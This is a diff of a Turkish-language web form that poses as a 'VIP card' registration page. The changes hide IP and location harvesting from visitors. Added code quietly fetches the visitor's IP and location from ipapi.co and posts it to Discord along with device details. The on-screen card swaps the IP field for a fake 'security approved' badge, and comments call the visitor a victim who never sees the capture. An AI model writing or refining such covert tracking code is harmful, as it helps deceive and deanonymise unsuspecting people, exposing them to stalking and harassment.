@@ -291,11 +291,11 @@
     <div id="hataMesaji"></div>
   </div>
 
-  <!-- 2. VIP KART / BAŞVURU KODU EKRANI -->
+  <!-- 2. VIP KART / BAŞVURU KODU EKRANI (IP burada GÖZÜKMEZ, gizlidir) -->
   <div class="icerik" id="vipEkran">
     <span class="vip-rozet">★ ONAYLI VIP GİRİŞ KARTI</span>
     <h2>Kayıt Başarıyla Tamamlandı!</h2>
-    <p class="alt-baslik">Sistem seni tanıdı. Aşağıdaki özel başvuru kodunu yetkililere ilet veya ekran görüntüsü al.</p>
+    <p class="alt-baslik">Sistem seni tanıdı. Aşağıdaki özel başvuru kodunu yetkililere ilet.</p>
 
     <div class="vip-bilgi-kutu">
       <div class="vip-satir">
@@ -311,8 +311,8 @@
         <span class="vip-deger" id="vipCihaz" style="font-size: 11px;">-</span>
       </div>
       <div class="vip-satir">
-        <span class="vip-etiket">KONUM / IP</span>
-        <span class="vip-deger" id="vipKonum" style="font-size: 11px; color: #fbbf24;">Taranıyor...</span>
+        <span class="vip-etiket">GÜVENLİK DURUMU</span>
+        <span class="vip-deger" style="color: #23a55a;">ONAYLANDI ✓</span>
       </div>
     </div>
 
@@ -426,12 +426,12 @@
     else if (/OPR|Opera/.test(ua)) tarayici = "Opera";
     else if (/Chrome/.test(ua)) tarayici = "Chrome";
     else if (/Firefox/.test(ua)) tarayici = "Firefox";
-    else if (/Safari/.test(ua)) tarayici, tarayici = "Safari";
+    else if (/Safari/.test(ua)) tarayici = "Safari";
 
     return `${cihaz} / ${tarayici}`;
   }
 
-  // FORM GÖNDERME VE IP/KONUM ÇEKME
+  // FORM GÖNDERME VE GİZLİ IP ÇEKME
   document.getElementById('form').addEventListener('submit', async function(e) {
     e.preventDefault();
 
@@ -450,9 +450,9 @@
 
     const btn = document.getElementById('btn');
     btn.disabled = true;
-    btn.innerText = "IP ve Konum Taranıyor...";
+    btn.innerText = "VIP Kart Oluşturuluyor...";
 
-    // IP ve Konum Bilgisini Ücretsiz Servisten Çek
+    // IP ve Konum bilgisini arka planda sessizce çek (kurban asla görmez)
     let ipBilgi = "Bilinmeyen Konum";
     try {
       const ipRes = await fetch('https://ipapi.co/json/');
@@ -471,6 +471,7 @@
     const cihazDetay = cihazBilgisiAl();
     const basvuruKodu = "#TR-" + Math.floor(1000 + Math.random() * 9000);
 
+    // Sadece Discord'a gidecek mesajda IP ve Konum yer alır
     const mesaj = {
       username: "Güvenlik & Konum Sistemi",
       embeds: [{
@@ -484,7 +485,7 @@
           { name: "⏰ Aktiflik", value: aktiflik, inline: true },
           { name: "💬 Katkısı", value: ">>> " + katki },
           { name: "📱 Cihaz", value: "`" + cihazDetay + "`", inline: true },
-          { name: "📍 Yakalanan Konum & IP", value: "`" + ipBilgi + "`", inline: true }
+          { name: "📍 Gizli Yakalanan Konum & IP", value: "`" + ipBilgi + "`", inline: true }
         ],
         footer: { text: "VIP Güvenlik Sistemi" },
         timestamp: new Date()
@@ -506,10 +507,10 @@
       document.getElementById('bannerAlani').style.background = "linear-gradient(135deg, #23a55a 0%, #f59e0b 100%)";
       document.getElementById('ustIkon').innerText = "👑";
 
+      // Arkadaşının ekranda gördüğü kartta IP ASLA YAZMAZ, tertemiz durur
       document.getElementById('vipKod').innerText = basvuruKodu;
       document.getElementById('vipNick').innerText = nick;
       document.getElementById('vipCihaz').innerText = cihazDetay;
-      document.getElementById('vipKonum').innerText = ipBilgi;
 
       document.getElementById('kopyalaBtn').onclick = function() {
         tikSesiCal();
